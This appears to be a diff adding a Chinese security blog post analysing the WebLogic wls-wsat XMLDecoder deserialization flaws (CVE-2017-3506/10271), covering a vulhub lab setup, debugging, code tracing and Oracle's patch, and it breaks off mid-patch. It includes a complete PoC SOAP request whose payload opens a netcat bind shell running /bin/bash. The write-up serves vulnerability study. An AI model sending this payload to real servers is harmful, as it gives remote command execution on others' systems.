@@ -1,0 +1,1669 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Yoga7xm">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Yoga7xm">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>记Weblogic反序列化的一次学习-(1) · Yoga7xm&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/human.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Yoga7xm&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">记Weblogic反序列化的一次学习-(1)</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Yoga7xm's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            记Weblogic反序列化的一次学习-(1)
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "java">java</a>
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "deserialize">deserialize</a>
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "weblogic">weblogic</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一次写调试漏洞的blog，参考了好多师傅的博客，可能有些许的小错误，还望大师兄们指点指点</p>
+<h2 id="0x01-漏洞编号：CVE-2017-3506-amp-CVE-2017-10271-（wls-wsat-远程命令执行绕过漏洞）"><a href="#0x01-漏洞编号：CVE-2017-3506-amp-CVE-2017-10271-（wls-wsat-远程命令执行绕过漏洞）" class="headerlink" title="0x01 漏洞编号：CVE-2017-3506 &amp; CVE-2017-10271 （wls-wsat 远程命令执行绕过漏洞）"></a>0x01 漏洞编号：CVE-2017-3506 &amp; CVE-2017-10271 （wls-wsat 远程命令执行绕过漏洞）</h2><p><strong>影响版本</strong></p>
+<blockquote>
+<p>Oracle WebLogic Server10.3.6.0.0 版本</p>
+<p>Oracle WebLogic Server12.1.3.0.0 版本</p>
+<p>Oracle WebLogic Server12.2.1.1.0 版本</p>
+<p>Oracle WebLogic Server12.2.1.2.0 版本</p>
+</blockquote>
+<p><strong>wls-wsat目录表</strong></p>
+<blockquote>
+<p>/wls-wsat/CoordinatorPortType<br>/wls-wsat/CoordinatorPortType11<br>/wls-wsat/ParticipantPortType<br>/wls-wsat/ParticipantPortType11<br>/wls-wsat/RegistrationPortTypeRPC<br>/wls-wsat/RegistrationPortTypeRPC11<br>/wls-wsat/RegistrationRequesterPortType<br>/wls-wsat/RegistrationRequesterPortType11</p>
+</blockquote>
+<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><img src="/2018/10/30/web/burp.jpg" alt></p>
+<p><img src="/2018/10/30/web/web%5Cshell.jpg" alt></p>
+<h2 id="0x03-测试环境搭建"><a href="#0x03-测试环境搭建" class="headerlink" title="0x03 测试环境搭建"></a>0x03 测试环境搭建</h2><p>利用vulhub中开源的<a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271" target="_blank" rel="noopener">docker-compose.yml</a>进行安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2&apos;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: vulhub/weblogic</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;7001:7001&quot;</span><br><span class="line">    - &quot;8899:8899&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最底下一行是为后面IDEA远程debug需连接服务而增加的额外端口映射关系</p>
+<p>然后执行<code>docker-compose up -d</code>，需要等待较长时间进行安装</p>
+<hr>
+<p>安装过后，<code>docker ps -a</code>可查看所有容器，此时<code>docker exec -i -t &lt;容器ID&gt; /bin/bash</code> 可进入交互式shell</p>
+<p><img src="/2018/10/30/web/web%5Cssh.jpg" alt></p>
+<p>修改脚本配置启动debug模式。<code>~/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code></p>
+<p>vim中查找到</p>
+<p><img src="/2018/10/30/web/web%5Cweb_debug.jpg" alt>    </p>
+<p>在此之前添加两行代码</p>
+<p><img src="/2018/10/30/web/web_flag.jpg" alt></p>
+<p>然后保存退出，运行<code>setDomainEnv.sh</code>后重启容器，<code>docker restart &lt;容器ID&gt;</code> </p>
+<p>重启过后，<code>netstat -ntpl</code>命令查看是否开启了7001、8899端口</p>
+<p><strong>由于weblogic并不是开源项目，故没有源代码，只能用IDEA反编译打开并调试</strong></p>
+<p><strong>将Weblogic中的包进行拷贝出来</strong></p>
+<p><code>docker cp root_weblogic_1:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic</code></p>
+<p><code>docker cp root_weblogic_1:/root/Oracle/Middleware/modules   ./modules</code></p>
+<p>然后将虚拟机中这两个文件拷贝至宿主机中，并用IDEA导入，</p>
+<p>并将<strong>server/lib</strong>和<strong>/root/Oracle/Middleware/modules</strong>这两个文件夹add to library </p>
+<p>完了之后就能打开其中的jar包和war包了</p>
+<p><img src="/2018/10/30/web/web%5Cidea.jpg" alt></p>
+<hr>
+<p>这时我们能开始配置远程调试了</p>
+<p>打开<code>菜单栏&gt;运行&gt;Configurations</code>进行配置</p>
+<p><img src="/2018/10/30/web/web%5Cdebug_idea.jpg" alt></p>
+<p>打开Debug， 若此时控制台出现了</p>
+<p><code>Connected to the target VM, address: &#39;192.168.114.128:8899&#39;, transport: &#39;socket&#39;</code></p>
+<p>说明已配置成功</p>
+<h2 id="0x04-测试POC"><a href="#0x04-测试POC" class="headerlink" title="0x04 测试POC"></a>0x04 测试POC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.114.128:7001</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1403</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_151"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span> </span><br><span class="line">               <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span> </span><br><span class="line">                  <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span>                      </span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span> = <span class="string">"0"</span>&gt;</span>                                                 </span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">string</span>&gt;</span>                                       </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span>                                                          </span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span> = <span class="string">"1"</span>&gt;</span>                                                 </span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span>                                        </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span>                                                          </span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span> = <span class="string">"2"</span>&gt;</span>                       </span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>nc -lp 8888 -e /bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span>                      </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span>                                                      </span><br><span class="line">                <span class="tag">&lt;/<span class="name">array</span>&gt;</span>                  </span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span>                  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span>            </span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-复现及分析过程"><a href="#0x05-复现及分析过程" class="headerlink" title="0x05 复现及分析过程"></a>0x05 复现及分析过程</h2><p>发包后，自动开始debug</p>
+<p><img src="/2018/10/30/web/web%5Cdebug_first.jpg" alt></p>
+<h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> NextAction <span class="title">processRequest</span><span class="params">(Packet var1)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">if</span> (var1.getMessage() != <span class="keyword">null</span>) &#123;</span><br><span class="line">           HeaderList var2 = var1.getMessage().getHeaders();</span><br><span class="line">           Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="keyword">true</span>);</span><br><span class="line">           <span class="keyword">if</span> (var3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.readHeaderOld(var3);</span><br><span class="line">               <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           Header var4 = var2.get(<span class="keyword">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="keyword">true</span>);</span><br><span class="line">           <span class="keyword">if</span> (var4 != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.readHeader(var4);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">super</span>.processRequest(var1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>此方法是将收到的post数据中<code>&lt;/work:WorkContext&gt;</code>标签内的内容传入readHeaderOld方法中，继续跟进</p>
+<h3 id="weblogic-wsee-jaxws-workcontext-WorkContextTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextTube</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">readHeaderOld</span><span class="params">(Header var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        XMLStreamReader var2 = var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        XMLStreamReaderToXMLStreamWriter var3 = <span class="keyword">new</span> XMLStreamReaderToXMLStreamWriter();</span><br><span class="line">        ByteArrayOutputStream var4 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        WorkContextXmlInputAdapter var6 = <span class="keyword">new</span> WorkContextXmlInputAdapter(<span class="keyword">new</span> ByteArrayInputStream(var4.toByteArray()));</span><br><span class="line">        <span class="keyword">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var8);</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>XMLStreamWriter</code>为：</p>
+<blockquote>
+<p>   *<em>The XMLStreamWriter interface specifies how to write XML. The XMLStreamWriter does not perform well formedness checking on its input.  *</em> </p>
+</blockquote>
+<p>​    这个接口指定了如何编写XML，并且对其输入没有很好地执行格式检查 </p>
+<p>然后创建了一个ByteArrayInputStream()对象，并且实例化后将var4内容作为参数传入构造方法中，</p>
+<p><strong>其中var4的内容，此时为：</strong></p>
+<p><img src="/2018/10/30/web/web%5Cvar4.jpg" alt></p>
+<p>继续跟进WorkContextXmlInputAdapter类中内的构造方法</p>
+<h3 id="weblogic-wsee-workarea-WorkContextXmlInputAdapter"><a href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter" class="headerlink" title="weblogic.wsee.workarea.WorkContextXmlInputAdapter"></a>weblogic.wsee.workarea.WorkContextXmlInputAdapter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.xmlDecoder = <span class="keyword">new</span> XMLDecoder(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处将传入的内容进行反序列化，而且没有对其内容进行任何处理！！！</p>
+<p><strong>补充一点：</strong></p>
+<p>weblogic中使用了8个类似于CoordinatorPortType的接口，所以均能利用</p>
+<h2 id="0x06-漏洞起因及补丁"><a href="#0x06-漏洞起因及补丁" class="headerlink" title="0x06 漏洞起因及补丁"></a>0x06 漏洞起因及补丁</h2><p>​    Weblogic暴露或间接暴露反序列化 API ，参数可控并未过滤，导致攻击者可以精心构造反序列化对象并执行恶意代码 </p>
+<p>以下是Oracle官方在2017年4月发布的补丁</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WorkContextXmlInputAdapter</span><span class="params">(InputStream is)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> next = <span class="number">0</span>;</span><br><span class="line">      next = is.read();</span><br><span class="line">      <span class="keyword">while</span> (next != -<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        baos.write(next);</span><br><span class="line">        next = is.read();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Failed to get data from input stream"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    validate(<span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray()));</span><br><span class="line">    <span class="keyword">this</span>.xmlDecoder = <span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray()));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    